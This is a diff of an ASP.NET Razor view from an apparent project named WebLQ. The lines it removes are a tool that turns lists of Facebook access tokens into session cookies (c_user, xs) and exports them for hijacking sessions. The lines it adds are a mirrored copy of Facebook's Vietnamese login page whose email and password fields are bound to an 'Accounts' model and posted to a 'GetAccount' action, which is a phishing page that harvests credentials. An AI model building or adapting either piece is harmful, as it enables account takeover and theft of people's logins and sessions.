@@ -1,131 +1,496 @@
-﻿
-@{
+﻿@{
     ViewData["Title"] = "Index";
 }
+@addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers
+@model WebLQ.Models.Accounts
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi" id="facebook" class="no_js">
+
+<!-- Mirrored from www.facebook.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 28 May 2021 15:16:31 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Document</title>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
+    <meta charset="utf-8" />
+    <meta name="referrer" content="default" id="meta_referrer" />
+    <script nonce="qT7hYwMC">window._cstart = +new Date();</script>
+
+    <title id="pageTitle">Đăng nhập Facebook</title>
+    <meta name="description"
+          content="H&#xe3;y &#x111;&#x103;ng nh&#x1ead;p Facebook &#x111;&#x1ec3; b&#x1eaf;t &#x111;&#x1ea7;u chia s&#x1ebb; v&#xe0; k&#x1ebf;t n&#x1ed1;i v&#x1edb;i b&#x1ea1;n b&#xe8;, gia &#x111;&#xec;nh v&#xe0; nh&#x1eef;ng ng&#x1b0;&#x1edd;i b&#x1ea1;n bi&#x1ebf;t." />
+    <meta property="og:site_name" content="Facebook" />
+    <meta property="og:url" content="https://www.facebook.com/login" />
+    <meta property="og:locale" content="vi_VN" />
+    <meta property="og:locale:alternate" content="www" />
+    <meta property="og:locale:alternate" content="es_LA" />
+    <meta property="og:locale:alternate" content="es_ES" />
+    <meta property="og:locale:alternate" content="fr_FR" />
+    <meta property="og:locale:alternate" content="it_IT" />
+    <meta property="og:locale:alternate" content="id_ID" />
+    <meta property="og:locale:alternate" content="th_TH" />
+    <meta property="og:locale:alternate" content="ko_KR" />
+    <meta property="og:locale:alternate" content="ja_JP" />
+    <link rel="canonical" href="login/web/index.html" />
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVBr.ico" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yc/l/0%2ccross/Zk6mNfneq5v1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="Nk+cqfl" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yu/l/0%2ccross/Lvu41JHRZC_1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="HX5XYac" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yp/l/0%2ccross/IlOBL6aM_Kn1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="/uaktyf" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yu/l/0%2ccross/OBg6eMg8yHk1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="1SP7TfB" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yU/l/0%2ccross/8SiSeIFbO9X1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="epDBIN3" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/yK/l/0%2ccross/swISLSA16YO1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="bP5bK5H" />
+    <link type="text/css" rel="stylesheet"
+          href="~/LoginFbPage/static.xx.fbcdn.net/rsrc.php/v3/ye/l/0%2ccross/kNFDXNPRIMn1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          data-bootloader-hash="aPNh5WD" />
 </head>
-<body style="padding-top: 50px;">
-    <div class="container">
-        <div class="panel panel-primary">
-            <div class="panel-heading">Get Cookies from Access Token</div>
-            <div class="panel-body">
-                <textarea id="access_token" rows="15" class="form-control" placeholder="Nhập list Access Token ..."></textarea>
-                <div class="col-md-12 text-center" style="font-size: 50px;">
-                    <div class="col-md-6" style="color: green" id="success">0</div>
-                    <div class="col-md-6" style="color: red" id="error">0</div>
-                </div>
-                <br>
-                <select id="option" class="form-control">
-                    <option value="editthiscookies">Export dạng Edit This Cookies</option>
-                    <option value="base64">Export dạng base64</option>
-                    <option value="base64_long">Export dạng base64 (name=value;)</option>
-                    <option value="semicolon">Export dạng name=value;</option>
-                </select>
-            </div>
-            <div class="panel-footer">
-                <div class="text-center">
-                    <button class="btn btn-primary" id="submit" data-loading-text="Đang gửi ...">Bắt đầu</button>
+
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh win x1 Locale_vi_VN"
+      dir="ltr">
+    <script nonce="qT7hYwMC">requireLazy(["bootstrapWebSession"], function (j) { j(1622214991) })</script>
+    <div class="_li" id="u_0_2_oA">
+        <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_3_M8">
+            <div class="_608m">
+                <div class="_5aj7 _tb6">
+                    <div class="_4bl7"><span class="mrm _3bcv _50f3">Chuyển tới</span></div>
+                    <div class="_4bl9 _3bcp">
+                        <div class="_6a _608n" aria-label="Tr&#x1ee3; l&#xfd; &#x111;i&#x1ec1;u h&#x1b0;&#x1edb;ng"
+                             aria-keyshortcuts="Alt+/" role="menubar" id="u_0_4_Ju">
+                            <div class="_6a uiPopover" id="u_0_5_78">
+                                <a role="button"
+                                   class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#"
+                                   style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle"
+                                   id="u_0_6_h4">
+                                    <span class="_55pe">Các phần của trang này</span><span class="_4o_3 _3-99"><i class="img sp_Oj-KKaCH-cM sx_09a25b"></i></span>
+                                </a>
+                            </div>
+                            <div class="_6a _3bcs"></div>
+                            <div class="_6a mrm uiPopover" id="u_0_7_Sm">
+                                <a role="button"
+                                   class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
+                                   href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1"
+                                   aria-expanded="false" rel="toggle" id="u_0_8_VO">
+                                    <span class="_55pe">
+                                        Trợ giúp về trợ
+                                        năng
+                                    </span><span class="_4o_3 _3-99">
+                                        <i class="img sp_Oj-KKaCH-cM sx_056d22"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="_4bl7 mlm pll _3bct">
+                        <div class="_6a _3bcy">
+                            Nhấn <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> để mở
+                            menu này
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
-        <div class="panel panel-primary">
-            <div class="panel-heading">Kết Quả</div>
-            <div class="panel-body">
-                <textarea id="output_access_token" rows="10" class="form-control" disabled="" placeholder="Chưa có gì !"></textarea>
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix " id="content" role="main">
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy">
+                        <img class="_97vu img"
+                             src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
+                    </div><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel" /><span class="muffin_tracking_pixel_end"></span>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <span class="_97w1 _50f6">
+                                <div class="_9axz">Đăng nhập Facebook</div>
+                            </span>
+                        </div>
+                        <div class="login_form_container">
+                            <form id="login_form"
+                                  action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=100"
+                                  method="post" onsubmit="">
+                                <input type="hidden" name="jazoest" value="21057"
+                                       autocomplete="off" /><input type="hidden" name="lsd" value="AVp_tvXoko0"
+                                                                   autocomplete="off" /><input type="hidden" autocomplete="off" id="error_box" />
+                                <div id="loginform">
+                                    <input type="hidden" autocomplete="off" id="display" name="display"
+                                           value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector"
+                                                             name="enable_profile_selector" value="" /><input type="hidden"
+                                                                                                              autocomplete="off" id="isprivate" name="isprivate" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return"
+                                                                                                                                                                                   value="0" /><input type="hidden" autocomplete="off" id="profile_selector_ids"
+                                                                                                                                                                                                      name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off"
+                                                                                                                                                                                                                                                    id="return_session" name="return_session" value="" /><input type="hidden"
+                                                                                                                                                                                                                                                                                                                autocomplete="off" id="skip_api_login" name="skip_api_login" value="" /><input type="hidden" autocomplete="off" id="signed_next" name="signed_next"
+                                                                                                                                                                                                                                                                                                                                                                                               value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum"
+                                                                                                                                                                                                                                                                                                                                                                                                                 value="1" /><input type="hidden" autocomplete="off" name="timezone" value=""
+                                                                                                                                                                                                                                                                                                                                                                                                                                    id="u_0_9_Tp" /><input type="hidden" autocomplete="off" name="lgndim" value=""
+                                                                                                                                                                                                                                                                                                                                                                                                                                                           id="u_0_a_aA" /><input type="hidden" name="lgnrnd" value="081631_HIPM" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" />
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text"
+                                               class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email"
+                                               id="email" tabindex="0" asp-for="Email"
+                                               placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i"
+                                               value="" autofocus="1" autocomplete="username"
+                                               aria-label="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" />
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <div>
+                                            <div class="_55r1 _1kbt">
+                                                <input type="password" asp-for="Password"
+                                                       class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass"
+                                                       id="pass" tabindex="0" placeholder="M&#x1ead;t kh&#x1ea9;u" value=""
+                                                       autocomplete="current-password"
+                                                       aria-label="M&#x1ead;t kh&#x1ea9;u" />
+                                                <div class="_9ls7" id="u_0_b_nP">
+                                                    <a href="#" role="button">
+                                                        <div class="_9lsa">
+                                                            <div class="_9lsb" id="u_0_c_mP"></div>
+                                                        </div>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_xkt">
+                                        <form asp-action="GetAccount" asp-controller="Login" method="post">
+                                            <button value="1"
+                                                    class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton"
+                                                    name="login" tabindex="0" type="submit">
+                                                Đăng nhập
+                                            </button>
+                                        </form>
+                                        
+                                    </div>
+                                    <div class="_xkv fsm fwn fcg" id="login_link">
+                                        <a href="recover/initiate/index9acb.html?ars=facebook_login" class="_97w4"
+                                           target="">Quên tài khoản?</a><span role="presentation" aria-hidden="true">
+                                            ·
+                                        </span><a href="r1a0b.html?locale=vi_VN&amp;display=page" rel="nofollow"
+                                                  class="_97w5">Đăng ký Facebook</a>
+                                    </div>
+                                </div><input type="hidden" autocomplete="off" id="prefill_contact_point"
+                                             name="prefill_contact_point" value="" /><input type="hidden" autocomplete="off"
+                                                                                            id="prefill_source" name="prefill_source" /><input type="hidden" autocomplete="off"
+                                                                                                                                               id="prefill_type" name="prefill_type" /><input type="hidden" autocomplete="off"
+                                                                                                                                                                                              id="first_prefill_source" name="first_prefill_source" /><input type="hidden"
+                                                                                                                                                                                                                                                             autocomplete="off" id="first_prefill_type" name="first_prefill_type" /><input type="hidden" autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled"
+                                                                                                                                                                                                                                                                                                                                           value="false" /><input type="hidden" autocomplete="off" id="had_password_prefilled"
+                                                                                                                                                                                                                                                                                                                                                                  name="had_password_prefilled" value="false" /><input type="hidden"
+                                                                                                                                                                                                                                                                                                                                                                                                                       autocomplete="off" name="ab_test_data" value="" />
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="">
+                <div class="_95ke">
+                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                            <li>Tiếng Việt</li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://en-gb.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;en_GB&quot;, &quot;vi_VN&quot;, &quot;https:\/\/en-gb.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 0); return false;"
+                                   title="English (UK)">English (UK)</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://zh-tw.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;zh_TW&quot;, &quot;vi_VN&quot;, &quot;https:\/\/zh-tw.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 1); return false;"
+                                   title="Traditional Chinese (Taiwan)">中文(台灣)</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;vi_VN&quot;, &quot;https:\/\/ja-jp.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 2); return false;"
+                                   title="Japanese">日本語</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://ko-kr.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/ko-kr.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 3); return false;"
+                                   title="Korean">한국어</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://th-th.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;th_TH&quot;, &quot;vi_VN&quot;, &quot;https:\/\/th-th.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 4); return false;"
+                                   title="Thai">ภาษาไทย</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/fr-fr.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 5); return false;"
+                                   title="French (France)">Français (France)</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://es-la.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;vi_VN&quot;, &quot;https:\/\/es-la.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 6); return false;"
+                                   title="Spanish">Español</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/pt-br.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 7); return false;"
+                                   title="Portuguese (Brazil)">Português (Brasil)</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://de-de.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;vi_VN&quot;, &quot;https:\/\/de-de.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 8); return false;"
+                                   title="German">Deutsch</a>
+                            </li>
+                            <li>
+                                <a class="_sv4" dir="ltr" href="https://it-it.facebook.com/login"
+                                   onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;vi_VN&quot;, &quot;https:\/\/it-it.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 9); return false;"
+                                   title="Italian">Italiano</a>
+                            </li>
+                            <li>
+                                <a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
+                                   ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Flogin&amp;source=www_list_selector_more"
+                                   href="#" title="Hi&#x1ec3;n th&#x1ecb; th&#xea;m ng&#xf4;n ng&#x1eef;">
+                                    <i class="img sp_wI4nx71ck5r sx_0772d1"></i>
+                                </a>
+                            </li>
+                        </ul>
+                        <div id="contentCurve"></div>
+                        <div id="pageFooterChildren" role="contentinfo"
+                             aria-label="Li&#xea;n k&#x1ebf;t trang web Facebook">
+                            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                                <li><a href="r.html" title="&#x110;&#x103;ng k&#xfd; Facebook">Đăng ký</a></li>
+                                <li>
+                                    <a href="login/index.html" title="&#x110;&#x103;ng nh&#x1ead;p Facebook">
+                                        Đăng
+                                        nhập
+                                    </a>
+                                </li>
+                                <li><a href="https://messenger.com/" title="Xem Messenger.">Messenger</a></li>
+                                <li>
+                                    <a href="lite/index.html" title="Facebook Lite d&#xe0;nh cho Android.">
+                                        Facebook
+                                        Lite
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="watch/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem video c&#x1ee7;a ch&#xfa;ng t&#xf4;i tr&#xea;n tab Watch.">
+                                        Watch
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="directory/people/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c con ng&#x1b0;&#x1edd;i c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Danh
+                                        bạ
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="directory/pages/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c trang c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">Trang</a>
+                                </li>
+                                <li><a href="pages/category/index.html">Hạng mục Trang</a></li>
+                                <li>
+                                    <a href="places/index.html"
+                                       title="Xem nh&#x1eef;ng &#x111;&#x1ecb;a &#x111;i&#x1ec3;m n&#x1ed5;i ti&#x1ebf;ng tr&#xea;n Facebook.">
+                                        Địa
+                                        điểm
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="games/index.html" title="Xem tr&#xf2; ch&#x1a1;i tr&#xea;n Facebook.">
+                                        Trò
+                                        chơi
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="directory/places/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c &#x111;&#x1ecb;a &#x111;i&#x1ec3;m c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Vị
+                                        trí
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="marketplace/index.html"
+                                       title="Mua b&#xe1;n tr&#xea;n Facebook Marketplace.">Marketplace</a>
+                                </li>
+                                <li>
+                                    <a href="https://pay.facebook.com/" target="_blank"
+                                       title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Facebook Pay">Facebook Pay</a>
+                                </li>
+                                <li>
+                                    <a href="directory/groups/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem danh m&#x1ee5;c nh&#xf3;m.">Nhóm</a>
+                                </li>
+                                <li>
+                                    <a href="jobs/index.html"
+                                       title="&#x1ee8;ng tuy&#x1ec3;n vi&#x1ec7;c l&#xe0;m v&#xe0; tuy&#x1ec3;n d&#x1ee5;ng tr&#xea;n Facebook.">
+                                        Việc
+                                        làm
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://www.oculus.com/" target="_blank"
+                                       title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Oculus">Oculus</a>
+                                </li>
+                                <li>
+                                    <a href="https://portal.facebook.com/" target="_blank"
+                                       title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Portal from Facebook">Portal</a>
+                                </li>
+                                <li>
+                                    <a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT2JRzLDx5WIx-7s8EEeF-8yLjbbgrvZdMcMK4hUDvkIy5Gi5VzIaVNBuRFGFULEU9eSqWcWJn6ZqJ_8d3-bUUtlnc_zIqpVyjqK7UXUn1abyeLII-3dqooqWiiVBKEFGEwQBkm9-_04J4VoZRMj3Q"
+                                       title="H&#xe3;y xem Instagram" target="_blank" rel="nofollow"
+                                       data-lynx-mode="hover">Instagram</a>
+                                </li>
+                                <li>
+                                    <a href="local/lists/245019872666104/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c Danh s&#xe1;ch &#x111;&#x1ecb;a ph&#x1b0;&#x1a1;ng c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Địa
+                                        phương
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="fundraisers/index.html"
+                                       title="Quy&#xea;n g&#xf3;p cho c&#xe1;c m&#x1ee5;c &#x111;&#xed;ch c&#xf3; &#xfd; ngh&#x129;a.">
+                                        Chiến
+                                        dịch gây quỹ
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="biz/directory/index.html"
+                                       title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c D&#x1ecb;ch v&#x1ee5; Facebook c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Dịch
+                                        vụ
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="votinginformationcenter/indexb3e6.html?entry_point=c2l0ZQ%3D%3D"
+                                       title="Xem Trung t&#xe2;m th&#xf4;ng tin b&#x1ecf; phi&#x1ebf;u.">
+                                        Trung tâm
+                                        thông tin bỏ phiếu
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://about.facebook.com/" accesskey="8"
+                                       title="&#x110;&#x1ecd;c blog c&#x1ee7;a ch&#xfa;ng t&#xf4;i, kh&#xe1;m ph&#xe1; trung t&#xe2;m t&#xe0;i nguy&#xea;n v&#xe0; t&#xec;m c&#x1a1; h&#x1ed9;i vi&#x1ec7;c l&#xe0;m.">
+                                        Giới
+                                        thiệu
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user&amp;h=AT28G9hTqUKx5by_xkLII49EOna2esxf6_O8PkPe5O0RBYWByi6s9fSztN4_sdsi5QtxsC-izubAou9GH7pTyPXOBA7n5uQ-7r668ZaIseif7KouQO1nv_VmLX3jD8XViFWSfyPYNOZ0yJK11CV0"
+                                       title="Qu&#x1ea3;ng c&#xe1;o tr&#xea;n Facebook.">Tạo quảng cáo</a>
+                                </li>
+                                <li>
+                                    <a href="pages/create/index30bf.html?ref_type=site_footer"
+                                       title="T&#x1ea1;o Trang">Tạo Trang</a>
+                                </li>
+                                <li>
+                                    <a href="https://developers.facebook.com/?ref=pf"
+                                       title="Pha&#x301;t tri&#xea;&#x309;n tr&#xea;n n&#xea;&#x300;n ta&#x309;ng cu&#x309;a chu&#x301;ng t&#xf4;i.">
+                                        Nhà
+                                        phát triển
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="careers/index30c2.html?ref=pf"
+                                       title="T&#x1ea1;o b&#x1b0;&#x1edb;c ngo&#x1eb7;t m&#x1edb;i trong s&#x1ef1; nghi&#x1ec7;p c&#x1ee7;a b&#x1ea1;n v&#x1edb;i c&#xf4;ng ty tuy&#x1ec7;t v&#x1edd;i c&#x1ee7;a ch&#xfa;ng t&#xf4;i">
+                                        Tuyển
+                                        dụng
+                                    </a>
+                                </li>
+                                <li>
+                                    <a data-nocookies="1" href="privacy/explanation.html"
+                                       title="T&#xec;m hi&#x1ec3;u v&#x1ec1; quy&#x1ec1;n ri&#xea;ng t&#x1b0; c&#x1ee7;a b&#x1ea1;n v&#xe0; Facebook">
+                                        Quyền
+                                        riêng tư
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="policies/cookies/index.html"
+                                       title="T&#xec;m hi&#x1ec3;u v&#x1ec1; cookie v&#xe0; Facebook."
+                                       data-nocookies="1">Cookie</a>
+                                </li>
+                                <li>
+                                    <a class="_41ug" data-nocookies="1" href="help/568137493302217.html"
+                                       title="T&#xec;m hi&#x1ec3;u v&#x1ec1; L&#x1ef1;a ch&#x1ecd;n qu&#x1ea3;ng c&#xe1;o.">
+                                        Lựa
+                                        chọn quảng cáo<i class="img sp_Oj-KKaCH-cM sx_ca6554"></i>
+                                    </a>
+                                </li>
+                                <li>
+                                    <a data-nocookies="1" href="policies_center/index.html?ref=pf" accesskey="9"
+                                       title="Xem l&#x1ea1;i &#x111;i&#x1ec1;u kho&#x1ea3;n v&#xe0; ch&#xed;nh s&#xe1;ch c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Điều
+                                        khoản
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="help/index30c2.html?ref=pf" accesskey="0"
+                                       title="Truy c&#x1ead;p Trung t&#xe2;m tr&#x1ee3; gi&#xfa;p c&#x1ee7;a ch&#xfa;ng t&#xf4;i.">
+                                        Trợ
+                                        giúp
+                                    </a>
+                                </li>
+                                <li>
+                                    <a accesskey="6" class="accessible_elem"
+                                       href="adpreferences/ad_settings/index9f21.html"
+                                       title="Xem v&#xe0; ch&#x1ec9;nh s&#x1eed;a c&#xe0;i &#x111;&#x1eb7;t Facebook.">
+                                        Cài
+                                        đặt
+                                    </a>
+                                </li>
+                                <li>
+                                    <a accesskey="7" class="accessible_elem"
+                                       href="allactivity99e1.html?privacy_source=activity_log_top_menu"
+                                       title="Xem nh&#x1ead;t k&#xfd; ho&#x1ea1;t &#x111;&#x1ed9;ng">
+                                        Nhật ký hoạt
+                                        động
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="mvl copyright">
+                            <div><span> Facebook © 2021</span></div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
+        <div></div><span>
+            <img src="../connect.facebook.net/security/hsts-pixel.gif?c=3.2.5" width="0" height="0"
+                 style="display:none" />
+        </span>
     </div>
-    <script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-    <script type="text/javascript">
-		jQuery(document).ready(function($) {
-			var access_token, option, success, error;
-			$("#submit").click(function() {
-				access_token = $("#access_token").val().trim().split("\n");
-				option       = $("#option").val();
-				success      = 0;
-				error        = 0;
-
-				$("#submit").button('loading');
-				run_script(0);
-			});
-
-			function run_script(index) {
-				if (index < access_token.length) {
-					get_cookies(index);
-				} else {
-					$("#submit").button('reset');
-					$("#output_access_token").removeAttr('disabled');
-				}
-			}
-
-			function get_cookies(index) {
-				$.get('https://graph.facebook.com/app', {
-					access_token: access_token[index]
-				}).done(function(e) {
-					$.get('https://api.facebook.com/v10.0/method/auth.getSessionforApp', {
-						access_token: access_token[index],
-						format: 'json',
-						new_app_id: e.id,
-						generate_session_cookies: '1'
-					}).done(function(e) {
-						if (e.uid) {
-							var text = '';
-							if (option == 'editthiscookies') {
-								text = JSON.stringify(e.session_cookies);
-}
-							if (option == 'base64') {
-								var c_user = $.grep(e.session_cookies, function(c) {
-									return c.name == 'c_user';
-								});
-								var xs     = $.grep(e.session_cookies, function(c) {
-									return c.name == 'xs';
-								});
-								text = btoa(decodeURIComponent(c_user[0].value + '|' + xs[0].value));
-							}
-							if (option == 'base64_long') {
-								var ss = '';
-								e.session_cookies.forEach(function(item) {
-									ss += item.name + '=' + item.value + ';';
-								});
-								text = btoa(ss);
-							}
-							if (option == 'semicolon') {
-								var ss = '';
-								e.session_cookies.forEach(function(item) {
-									ss += item.name + '=' + item.value + ';';
-								});
-								text = ss;
-							}
-							$("#output_access_token").append(text + "\n");
-							++success;
-							$("#success").text(success);
-						} else {
-							++error;
-							$("#error").text(error);
-						}
-					}).error(function(e) {
-						++error;
-						$("#error").text(error);
-					}).always(function() {
-						run_script(index + 1);
-					});
-				}).error(function() {
-					++error;
-					$("#error").text(error);
-					run_script(index + 1);
-				});
-			}
-		});
-    </script>
+    <div style="display:none"></div>
+    <script>
+    now_inl = (function () {
+            var p = window.performance; return p && p.now && p.timing && p.timing.navigationStart ? function () { return p.now() + p.timing.navigationStart } : function () { return new Date().getTime() };
+        })(); window.__bigPipeFR = now_inl();</script>
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yc/l/0%2ccross/Zk6mNfneq5v1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yu/l/0%2ccross/Lvu41JHRZC_1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yp/l/0%2ccross/IlOBL6aM_Kn1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yu/l/0%2ccross/OBg6eMg8yHk1f8e.css?_nc_x=Ij3Wp8lg5Kz"
